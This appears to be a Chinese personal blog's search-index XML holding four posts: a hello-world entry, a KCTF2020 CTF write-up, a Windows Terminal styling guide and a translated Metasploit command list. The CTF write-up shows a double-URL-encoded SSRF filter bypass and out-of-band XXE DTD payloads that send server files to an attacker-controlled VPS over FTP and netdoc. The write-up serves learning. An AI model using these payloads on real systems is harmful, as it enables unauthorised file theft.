<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/1899/11/30/Hello_World/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>你好！！！</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello, world\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(●’◡’●)</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>hello world</tag>
      </tags>
  </entry>
  <entry>
    <title>KCTF2020 WriteUp</title>
    <url>/2020/11/20/KCTF2020%20WriteUp/</url>
    <content><![CDATA[<h2 id="第一题-至暗时刻"><a href="#第一题-至暗时刻" class="headerlink" title="第一题 至暗时刻"></a>第一题 至暗时刻</h2><a id="more"></a>

<p>题目描述：</p>
<p>一道Web题，访问链接：</p>
<p><a href="http://121.36.145.157:8088/" target="_blank" rel="noopener">http://121.36.145.157:8088/</a></p>
<p>利用技术绕过限制，获得flag.txt文件中的值。</p>
<p>访问页面，是一张图片，查看页面源代码：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic1.png" alt=" "></p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;title&gt;test&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;img src=&quot;/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg&quot;&gt;
&lt;!--测试加载配置文件 /loadConfig?url=x.xml--&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>发现一个被注释掉的url:  </p>
<pre><code>http://121.36.145.157:8088/loadConfig?url=x.xml  </code></pre><p>看样子貌似可以访问指定的url<br>但访问页面返回<code>not allow ip</code>，IP不被允许：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic2.png" alt=" ">  </p>
<p>尝试 <code>X-Forwarded-For</code> 伪造客户端IP<br>抓包到burp中，爆破了一些内网ip都显示<code>not allow ip</code>:  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic3.png" alt=" ">  </p>
<p>仅192.168端就有60000多个ip，显然也不会是爆破去做-_-|</p>
<p>回顾前面的网页源码发现另一个用来加载图片的链接：  </p>
<pre><code>http://121.36.145.157:8088/getimage?url=https://bbs.pediy.com/upload/attach/202009/236762_Y76C73KQC7MG83G.jpg</code></pre><p>是访问指定的url获取资源的，尝试修改url参数，返回如下的正则表达式：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic4.png" alt=" ">  </p>
<pre><code>illegal url! ^(http|https):\\/\\/[^?#\\/]*\\.pediy\\.com\\/.*</code></pre><p>应该是要想办法绕过这个正则，访问指定的url<br>这个正则要求url是如下格式：  </p>
<pre><code>http://{1}.pediy.com/{2}
或
https://{1}.pediy.com/{2}</code></pre><p>{1}处不允许出现’？’，’#’，’/‘字符<br>{2}处可以是任意内容</p>
<p>直接用’#’无法通过正则：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic5.png" alt=" "> </p>
<p>尝试进行URL编码，还是不能通过正则：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic6.png" alt=" "> </p>
<p>换其它符号试试，发现在做正则检查前会进行一次URL解码：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic7.png" alt=" "></p>
<p>尝试进行两次URL编码绕过：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic8.png" alt=" "></p>
<p>绕过成功，已经尝试去访问 <code>https://127.0.0.1</code> 了  </p>
<p>在自己的vps起了web服务，用这个ssrf去访问，企图获得真实IP，然后用这个IP去利用第一个接口：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic9.png" alt=" "></p>
<p>这里注意到，我的web是起在5000端口的，但直接输 <code>http://ip:port</code> 的形式会报错 <code>invalid port number</code>  </p>
<p>所以’:’也要两次URL编码，访问成功，但是在我的vps获得的IP是 <code>121.36.145.157</code> :  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic10.png" alt=" "></p>
<p>这不就是题目地这么，拿去 <code>/loadConfig?url=x.xml</code> 那里尝试，依然是 <code>not allow ip</code> ，行不通  </p>
<p>又尝试ssrf <code>http://127.0.0.1:8088/loadConfig?url=x.xml</code> 这个url，构造请求：  </p>
<pre><code>http://121.36.145.157:8088/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=x.xml</code></pre><p>返回结果，访问成功： </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic11.png" alt=" "></p>
<p>发到burp中继续尝试：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic12.png" alt=" "></p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic13.png" alt=" "></p>
<p>发现会从 <code>/loadConfig?url=x.xml</code> 指定的位置读取文件并当作XML来解析，猜测XXE漏洞  </p>
<p>在自己的vps上放了以下payload：  </p>
<pre><code>=================================================================================
&lt;!-- t.dtd --&gt;
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;
&lt;!ENTITY sp SYSTEM &quot;file:///etc/issue&quot;&gt;
]&gt;
&lt;r&gt;&amp;sp;&lt;/r&gt;
=================================================================================</code></pre><p>构造请求：  </p>
<pre><code>/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://{my_vps_ip}:5000/t.dtd</code></pre><p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic14.png" alt=" "></p>
<p>没有正常回显内容，尝试用FTP协议把内容发送出来，payload:  </p>
<pre><code>=================================================================================
&lt;!-- c.dtd --&gt;
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE r [
&lt;!ENTITY % data3 SYSTEM &quot;file:///etc/issue&quot;&gt;
&lt;!ENTITY % sp SYSTEM &quot;http://my_vps_ip:5000/d.dtd&quot;&gt;
%sp;
%param3;
%exfil;
]&gt;
=================================================================================
&lt;!-- d.dtd --&gt;
&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;ftp://my_vps_ip:30000/%data3;&apos;&gt;&quot;&gt;
=================================================================================</code></pre><p>并在vps的30000端口上起了ftp服务，脚本：<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="noopener">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a>  </p>
<p>构造请求：  </p>
<pre><code>/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/c.dtd</code></pre><p>在vps上接收到内容 <code>/etc/issue</code> 文件的内容：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic15.png" alt=" "></p>
<p>但是尝试读含有特殊字符的文件时，就无法正常发送数据到vps:  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic16.png" alt=" "></p>
<p>而且没法查看目录，没办法找flag<br>之后又用netdoc协议试试，可以列目录，最终使用以下payload：  </p>
<pre><code>=================================================================================
&lt;!-- g.dtd --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE creds [
&lt;!ENTITY % data3 SYSTEM &quot;netdoc:///&quot;&gt;
&lt;!ENTITY % sp SYSTEM &quot;http://my_vps_ip:5000/d.dtd&quot;&gt;
%sp;
%param3;
%exfil;n
]&gt;
=================================================================================
&lt;!-- d.dtd --&gt;
&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;netdoc://my_vps_ip:80/%data3;&apos;&gt;&quot;&gt;
=================================================================================</code></pre><p>构造请求：  </p>
<pre><code>/getimage?url=http://127.0.0.1%253a8088%2523.pediy.com/loadConfig?url=http://my_vps_ip:5000/g.dtd</code></pre><p>在burp中可以回显，已经可以列目录，读文件了：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic17.png" alt=" "><br><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic18.png" alt=" "></p>
<p>之后就是列目录，看文件。。。</p>
<p>最后在/home下有一些jar包：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic19.png" alt=" ">  </p>
<p>用jar:file：读jar包，尝试了spring jar包常见的路径</p>
<p>最后找到flag.txt的路径是 <code>vip-demo-0.0.1-SNAPSHOT.jar</code>包下的 <code>/BOOT-INF/classes/flag.txt</code>，payload：  </p>
<pre><code>=================================================================================
&lt;!-- g.dtd --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE creds [
&lt;!ENTITY % data3 SYSTEM &quot;jar:file:///home/vip-demo-0.0.1-SNAPSHOT.jar!/BOOT-INF/classes/flag.txt&quot;&gt;
&lt;!ENTITY % sp SYSTEM &quot;http://{my_vps_ip}:5000/d.dtd&quot;&gt;
%sp;
%param3;
%exfil;n
]&gt;
=================================================================================
&lt;!-- d.dtd --&gt;
&lt;!ENTITY % param3 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &apos;netdoc://101.37.76.66:80/%data3;&apos;&gt;&quot;&gt;
=================================================================================</code></pre><p>获得flag截图：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-First-WP/pic20.png" alt=" "></p>
<p>获得的flag是 <code>flag{congratulations-Path-the-spring-boot}</code></p>
<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><!--more-->

<p>目标程序执行如下：<br><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic1.png" alt="pic1"><br>需要输入正确的flag  </p>
<p>直接在IDA Pro中打开 F5查看<br><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic2.png" alt="pic2"><br>分析代码：  </p>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
char *v3; // rdx
signed __int64 v4; // rcx
int *v5; // r8
__int64 v6; // rax
char v7; // dl
char v8; // cl
char v9; // cl
int v11; // [rsp+20h] [rbp-E0h]
__int16 v12; // [rsp+24h] [rbp-DCh]
char Dst; // [rsp+30h] [rbp-D0h]
char v14; // [rsp+31h] [rbp-CFh]
char v15; // [rsp+32h] [rbp-CEh]
char v16; // [rsp+33h] [rbp-CDh]
char v17; // [rsp+34h] [rbp-CCh]
int v18; // [rsp+35h] [rbp-CBh]
__int16 v19; // [rsp+39h] [rbp-C7h]
char v20; // [rsp+3Bh] [rbp-C5h]
char v21; // [rsp+130h] [rbp+30h]
char v22; // [rsp+131h] [rbp+31h]
char v23; // [rsp+132h] [rbp+32h]
char v24; // [rsp+133h] [rbp+33h]
char v25; // [rsp+134h] [rbp+34h]
char v26; // [rsp+135h] [rbp+35h]

memset(&amp;Dst, 0, 0x100ui64);
memset(&amp;v21, 0, 0x100ui64);
sub_140001250((__int64)&quot;KCTF 2020!\n&quot;);
sub_140001250((__int64)&quot;http://bbs.pediy.com\n&quot;);
sub_140001250((__int64)&quot;Please input your flag: &quot;);
sub_1400011E0((__int64)&quot;%s&quot;, &amp;Dst, 256i64);
v3 = &amp;Dst;
v4 = -1i64;
do
    ++v4;
while ( *(&amp;Dst + v4) );
if ( (_DWORD)v4 == 12 &amp;&amp; Dst == 102 &amp;&amp; v14 == 108 &amp;&amp; v15 == 97 &amp;&amp; v16 == 103 &amp;&amp; v17 == 123 &amp;&amp; v20 == 125 )
{
    v5 = &amp;v11;
    v6 = 0i64;
    v12 = v19;
    v3 = 0i64;
    v11 = v18;
    while ( (unsigned __int8)(*(_BYTE *)v5 - 48) &lt;= 9u )
    {
    v3 = (char *)(unsigned int)((_DWORD)v3 + 1);
    v5 = (int *)((char *)v5 + 1);
    if ( (unsigned int)v3 &gt;= 6 )
    {
        v21 = v18;
        v7 = v18 + BYTE1(v18) - 48 + BYTE2(v18) - 48;
        v22 = v18 + BYTE1(v18) - 48;
        v23 = v7;
        v8 = v7 + HIBYTE(v18) - 48;
        v3 = &amp;v21;
        v24 = v8;
        v25 = v8 + v19 - 48;
        v26 = v25 + HIBYTE(v19) - 48;
        while ( 1 )
        {
        v9 = *(&amp;v21 + v6++);
        if ( v9 != a2Efi[v6 - 1] )
            break;
        if ( v6 == 7 )
        {
            sub_140001250((__int64)&quot;You are winner!\n&quot;, &amp;v21, &quot;2;=EFI&quot;);
            return 0;
        }
        }
        break;
    }
    }
}
sub_140001250((__int64)&quot;Try again!\n&quot;, v3);
return -1;
}</code></pre><hr>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic3.png" alt="pic3">  </p>
<p>输入的字符串从Dst处开始存放  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic7.png" alt="pic7">  </p>
<p>首先会做以下判断：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic4.png" alt="pic4">  </p>
<p>查询ASCII码，DST、v14、v15、v16、v17和v20处对应的字符分别应该是<br>‘f’、’l’、’a’、’g’、’{‘和’}’  </p>
<p>然后会继续做以下判断：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic5.png" alt="pic5">  </p>
<p>从v21往后的字符要分别等于a2Efi中的字符，</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic8.png" alt="pic8">  </p>
<p>看到对应的字符是2;=EFI  </p>
<p>ASCII码分别是 50 59 61 69 70 73  </p>
<p>要比较六个字符，列出以下对应关系：  </p>
<pre><code>v21 = 50  
v22 = 59  
v23 = 61  
v24 = 69  
v25 = 70  
v26 = 73  </code></pre><p>观察这六个变量的值是如何取得：  </p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/KCTF2020-CheckIn-WP/pic6.png" alt="pic6">  </p>
<p>发现是根据v18和v19的值决定的<br>从上面定义处可以发现v18是一个int型变量，所以占4个字节，四个字节中的值分别设为A、B、C、D<br>v19是一个16位的int型，占2个字节，值分别设为E、F  </p>
<pre><code>BYTE1(v18) 取v18的第二个字节 B
BYTE2(v18) 取v18的第三个字节 C
HIBYTE(v18) 取v18最高位的一个字节 D
HIBYTE(v19) 取v19最高位的一个字节 F
v18 和 v19 在存放到一个字节的内存时，高位字节丢失，分别取最低位A和E</code></pre><p>所以根据上图，列出以下关系式：  </p>
<pre><code>50 = v21 = A  
59 = v22 = A + B - 48  
61 = v23 = A + B - 48 + C - 48   
69 = v24 = A + B - 48 + C - 48 + D - 48  
70 = v25 = A + B - 48 + C - 48 + D - 48 + E - 48  
73 = v26 = A + B - 48 + C - 48 + D - 48 + E - 48 + F - 48  </code></pre><p>得到结果：</p>
<pre><code>A = 50  
B = 57
C = 50
D = 56
E = 49
F = 51</code></pre><p>对应的字符分别是：2、9、2、8、1、3<br>所以得到最终结果就是：flag{292813}</p>
<blockquote>
<p>作者：Boringboys<br>原文链接：<a href="https://www.boringboys.top/2020/11/20/KCTF2020第一题WP/">https://www.boringboys.top/2020/11/20/KCTF2020第一题WP/</a><br>版权声明：本文采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">BY-NC-SA</a>协议授权，转载请遵守此协议</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Terminal安装和美化</title>
    <url>/2021/07/25/Windows%20Terminal%E5%AE%89%E8%A3%85%E5%92%8C%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<p>最近组了一台主机，然后根据自己的使用习惯又做了一些软件上的配置，这篇文章记录一下Windows Terminal的安装和简单美化。</p>
<a id="more"></a>

<h2 id="安装-Windows-Terminal"><a href="#安装-Windows-Terminal" class="headerlink" title="安装 Windows Terminal"></a>安装 Windows Terminal</h2><p>从微软应用商店安装 <strong>Windows Terminal</strong>：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/%E4%BB%8EMicrosoft%20Store%E5%AE%89%E8%A3%85Windows%20Terminal.png" alt="从Microsoft Store安装Windows Terminal"></p>
<p>Windows Terminal截图如下：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%E6%88%AA%E5%9B%BE.png" alt="Windows Terminal截图"></p>
<h2 id="Windows-Terminal-配置主题"><a href="#Windows-Terminal-配置主题" class="headerlink" title="Windows Terminal 配置主题"></a>Windows Terminal 配置主题</h2><p>点击 <strong>新建标签页旁的下拉倒三角-&gt;Settings（设置）</strong> 打开设置页面：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%E8%AE%BE%E7%BD%AE%E5%85%A5%E5%8F%A3.png" alt="Windows Terminal设置入口"></p>
<p>在设置页面左侧点击 <strong>Open JSON file（打开JSON文件）</strong> ，从而通过Json配置文件进行自定义设置：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20Json%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png" alt="Windows Terminal Json配置文件"></p>
<p>配置文件结构大致长下图这样，文件中的注释已经讲述了不同配置位置的作用，我这里就稍微再详细描述一下，其中 <strong>schemes</strong> 列表中存放一些配色方案，</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E7%9A%84%E4%BD%8D%E7%BD%AE.png" alt="Windows Terminal 自定义主题添加的位置"></p>
<p>配色方案添加的格式如下图所示，可以添加很多个配色方案，并给他们定义对应的名字，方便在自定义配置中引用：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%BB%E9%A2%98%E5%B9%B6%E9%85%8D%E7%BD%AE%E4%B8%BB%E9%A2%98%E5%90%8D%E5%AD%97.png" alt="Windows Terminal 添加自定义主题并配置主题名字"></p>
<blockquote>
<p>至于什么是配色方案？emmm…据我的观察，应该就是定义红（red）是什么样的红，黑（black）是什么样的黑，以及黄（yellow）是什么样的黄这样的配置，以此类推，（逃）</p>
</blockquote>
<p>然后是 <strong>profiles</strong>，这里就是添加一些配置的地方了，其中 <strong>profiles-&gt;list</strong> 列表中保存一些单独的配置，而 <strong>profiles-&gt;defaults</strong> 中是应用到所有配置中的通用配置，列表中的每个配置都有自己的名字，配置添加格式和 <strong>schemes</strong> 列表一样：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE.png" alt="Windows Terminal 自定义配置"></p>
<ul>
<li><p><strong>colorScheme</strong> 参数即配色方案，可以引用上面定义的那些配色方案。注意，每个配置（profile）的配色方案也可以不通过colorScheme参数引用，而是直接把配色方案写在配置中；</p>
</li>
<li><p><strong>commandline</strong> 参数设置了该配置使用的终端，包括powershell、cmd、git等…</p>
</li>
<li><p><strong>fontFace</strong> 参数设置该配置使用的字体</p>
</li>
<li><p><strong>tabTitle</strong> 参数是此配置打开的标签的标题；</p>
</li>
<li><p><strong>name</strong> 参数就是该配置的名字，出现在打开新标签页的下拉菜单中；</p>
</li>
</ul>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E7%9A%84name%E5%92%8CtabTitle.png" alt="Windows Terminal 配置的name和tabTitle"></p>
<p>这个网站有一些别人提供的配置，可以参考一下：<br><a href="https://terminalsplash.com/" target="_blank" rel="noopener">https://terminalsplash.com/</a></p>
<p>配置背景图片，通过 <strong>backgroundImage</strong> 参数可以自定义终端的背景图片，同时也可以通过参数配置背景图片的位置、透明度等：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.png" alt="Windows Terminal配置背景图片"></p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/Windows%20Terminal%20%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.png" alt="Windows Terminal背景图片"></p>
<h2 id="安装-oh-my-posh"><a href="#安装-oh-my-posh" class="headerlink" title="安装 oh-my-posh"></a>安装 oh-my-posh</h2><p>为了有和Linux上 <strong>oh-my-zsh</strong> 类似的体验，下面还会安装 <strong>oh-my-posh</strong> 模块对Powershell进一步进行美化</p>
<p>使用管理员身份启动Powershell，安装 <strong>posh-git</strong> 和 <strong>oh-my-posh</strong> 模块，安装前设置权限为 <strong>RemoteSigned</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Install-Module posh-git -Scope CurrentUser</span><br><span class="line">Install-Module oh-my-posh -Scope CurrentUser</span><br></pre></td></tr></table></figure>

<p>安装时如果提示需要安装 <strong>NuGet</strong>，同意安装即可。</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/%E5%AE%89%E8%A3%85posh-git.png" alt="安装posh-git"></p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/%E5%AE%89%E8%A3%85oh-my-posh.png" alt="安装oh-my-posh"></p>
<p>为了让Powershell有彩色输出，还需要安装 <strong>Get-ChildItemColor</strong> 模块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Install-Module -AllowClobber Get-ChildItemColor</span><br></pre></td></tr></table></figure>

<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/%E5%AE%89%E8%A3%85Get-ChildItemColor.png" alt="安装Get-ChildItemColo"></p>
<p>编辑 <strong>Powershell 配置文件</strong> </p>
<p><code>$PROFILE</code> 查看配置文件路径</p>
<p><code>code $PROFILE</code> 使用vscode打开配置文件，使用其他编辑器的自行操作，用什么编辑器不重要</p>
<p>在配置文件中，输入以下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module posh-git</span><br><span class="line">Import-Module oh-my-posh</span><br><span class="line">Set-PoshPrompt -Theme half-life  &#x2F;&#x2F; 设置主题</span><br><span class="line">If (-Not (Test-Path Variable:PSise)) &#123;</span><br><span class="line">    Import-Module Get-ChildItemColor</span><br><span class="line">    Set-Alias l Get-ChildItem -option AllScope</span><br><span class="line">    Set-Alias ls Get-ChildItemColorFormatWide -option AllScope</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>Set-PoshPrompt -Theme half-life</code> 设置了 <strong>oh-my-posh</strong> 主题 <strong>half-life</strong>，这里可以根据自己喜好选择不同的主题，可以通过命令 <code>Get-PoshThemes</code> 获取主题列表</p>
<p>配置后的Powershell的样子：</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/%E9%85%8D%E7%BD%AEoh-my-posh%E4%B9%8B%E5%90%8E%E7%9A%84%E6%A0%B7%E5%AD%90.png" alt="配置oh-my-posh之后的样子"></p>
<p>可以看到有一些乱码，因为很多oh-my-posh主题使用的是powerline字体，你的系统上可能没有安装，可以自行到这里下载并安装自己喜欢的powerline字体：<a href="https://github.com/powerline/fonts" target="_blank" rel="noopener">https://github.com/powerline/fonts</a></p>
<p>安装好字体后还需要配置Windows Terminal使用安装好的字体才可以</p>
<p>Windows Terminal字体的配置就是在上面提到的 <strong>profile</strong> 中的 <strong>fontFace</strong> 参数</p>
<p>针对vscode等其它应用，也需要配置终端使用powerline字体才可以正常显示，具体方法自行检索</p>
<p><strong>oh-my-posh</strong> 展示</p>
<p><img src="https://boringboys-1254394685.cos.ap-shanghai.myqcloud.com/img/Windows-Terminal-Install/oh-my-posh%E4%B8%BB%E9%A2%98%E5%B1%95%E7%A4%BA.png" alt="oh-my-posh主题展示"></p>
<blockquote>
<p>参考教程：<a href="https://blog.reilkay.com/BeautifyWindowsTerminal/" target="_blank" rel="noopener">https://blog.reilkay.com/BeautifyWindowsTerminal/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>工具安装</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>Windows Terminal</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit命令学习</title>
    <url>/2018/03/29/Metasploit%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>为了方便自己后期的学习，我把metasploit的帮助信息简单翻译了一下，包括命令和一些用法描述。</p>
<a id="more"></a>

<h1 id="核心命令"><a href="#核心命令" class="headerlink" title="核心命令"></a>核心命令</h1><pre><code>命令          描述
-------       -----------
?             帮助菜单
banner        在命令行里显示一个好看的metasploit图案（一个很有趣的命令^0^）
cd            更改当前工作目录
color         启用或禁用颜色输出
connect       连接到一个主机
exit          退出msfconsole
get           获得一个上下文特定变量的值
getg          获得一个全局变量的值
grep          从另一个命令的输出中查找符合条件的行
help          帮助菜单
history       显示历史命令
load          加载框架插件
quit          退出msfconsole（有提示Y/N）
repeat        重复一个命令列表
route         通过会话路由流量
save          保存活动数据
sessions      转储会话列表并显示有关会话的信息
set           设置一个上下文特定变量的值
setg          设置一个全局变量的值
sleep         在指定的秒数内不执行任何操作
spool         将控制台输出写入某个文件
threads       查看和操纵后台线程
unload        卸载框架插件
unset         取消设置一个或多个上下文特定变量的值
unsetg        取消设置一个或多个全局变量的值
version       显示框架和控制台库版本号</code></pre><h1 id="模块命令"><a href="#模块命令" class="headerlink" title="模块命令"></a>模块命令</h1><pre><code>命令             描述
-------       -----------
advanced      显示一个或多个模块的高级选项
back          从当前上下文后退
info          显示一个或多个模块的信息
loadpath      从路径搜索模块并加载
options       显示一个或多个模块的全局选项
popm          将最新模块弹出堆栈并使其激活
previous      将先前加载的模块设置为当前模块
pushm         将活动模块或模块列表推入模块堆栈
reload_all    从所有定义的模块路径重新加载所有模块
search        搜索模块名称和描述
show          显示给定类型的模块，或者所有模块
use           按名称选择模块</code></pre><h1 id="作业命令"><a href="#作业命令" class="headerlink" title="作业命令"></a>作业命令</h1><pre><code>命令          描述
-------       -----------
handler       启动有效负载处理程序作为作业
jobs          显示和管理作业
kill          杀死作业
rename_job    重命名作业</code></pre><h1 id="资源脚本命令"><a href="#资源脚本命令" class="headerlink" title="资源脚本命令"></a>资源脚本命令</h1><pre><code>命令          描述
-------       -----------
makerc        将启动之后输入的命令保存到文件中
resource      运行文件中的命令</code></pre><h1 id="数据库后端命令"><a href="#数据库后端命令" class="headerlink" title="数据库后端命令"></a>数据库后端命令</h1><pre><code>命令              描述
-------           -----------
analyze           分析有关特定地址或地址范围的数据库信息
db_connect        连接到现有的数据服务
db_disconnect     断开当前数据服务
db_export         导出包含数据库内容的文件
db_import         导入扫描结果文件（将自动检测文件类型）
db_nmap           执行nmap并自动记录输出
db_rebuild_cache  重建数据库存储的模块缓存
db_remove         删除保存的数据服务条目
db_save           将当前数据服务连接保存为默认值，以便在启动时重新连接
db_status         显示当前数据服务状态
hosts             列出数据库中的所有主机
loot              列出数据库中的所有Loot(战利品)
notes             列出数据库中的所有注释
services          列出数据库中的所有服务
vulns             列出数据库中的所有漏洞
workspace         在数据库工作区之间切换</code></pre><h1 id="凭证后端命令"><a href="#凭证后端命令" class="headerlink" title="凭证后端命令"></a>凭证后端命令</h1><pre><code>命令          描述
-------       -----------
creds         列出数据库中的所有证书</code></pre><h1 id="开发人员命令"><a href="#开发人员命令" class="headerlink" title="开发人员命令"></a>开发人员命令</h1><pre><code>命令          描述
-------       -----------
edit          使用首选的编辑器编辑当前模块或文件
irb           在当前上下文中打开一个交互式Ruby Shell
log           如果可以，将framework.log显示到页面末尾
pry           在当前模块或框架上打开Pry调试器
